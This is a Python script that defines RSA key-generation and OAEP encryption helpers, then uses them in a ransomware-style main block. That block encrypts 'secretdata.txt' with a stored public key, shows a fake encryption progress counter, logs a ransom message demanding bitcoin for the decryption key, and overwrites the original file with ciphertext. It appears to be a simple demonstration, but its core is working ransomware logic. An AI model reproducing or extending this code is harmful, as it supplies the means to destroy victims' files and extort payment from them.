from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, RSAPublicKey
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import os
from loguru import logger
import time



def generate_and_save_private_and_public_key(private_key_file_name, public_key_file_name):
    # Generate a private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # Serialize the private key to PEM format and save it to a file
    with open(private_key_file_name, "wb") as f:
        f.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            )
        )
    # Get the corresponding public key
    public_key = private_key.public_key()

    # Serialize the public key to PEM format and save it to a file
    with open(public_key_file_name, "wb") as f:
        f.write(
            public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        )

def load_private_key(private_key_file_name):
    # Load the private key from the file
    if not os.path.exists(private_key_file_name):
        #print('waiting for public key file to be created by server...')
        logger.warning('private key file not found!')
        return False
    with open(private_key_file_name, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)
    
def load_public_key(public_key_file_name):
    # Load the public key from the file
    if not os.path.exists(public_key_file_name):
        #print('waiting for public key file to be created by server...')
        logger.warning('public key file not found!')
        return False
    with open(public_key_file_name, "rb") as f:
        return serialization.load_pem_public_key(f.read(), backend=default_backend())

def encrypt_message(message: bytes, public_key: RSAPublicKey):
    return public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )

def decrypt_message(message: bytes, private_key: RSAPrivateKey):
    return private_key.decrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )


if __name__ == "__main__":
    with open('secretdata.txt', 'rb') as f:
        data = f.read()
    enc_msg = encrypt_message(data, load_public_key('client_public_key.pem'))
    # do not decode encrypt_message as it has not normal bytes which is not able to decode with utf-8
    for i in range(1000):
        print(f"Enrpting {i+1} files ...", end="\r", flush=True)
        time.sleep(0.01)
    logger.warning("""
All of your files are encrypted!
Total files encrypted: 100
If you want to decrypt the files, please contact us send money to our bitcoin address
in order to get the decryption key.
""")
    with open('secretdata.txt', 'wb') as f:
        f.write(enc_msg)
    #dec_msg = decrypt_message(enc_msg, load_private_key('client_private_key.pem'))
    #print(dec_msg.decode())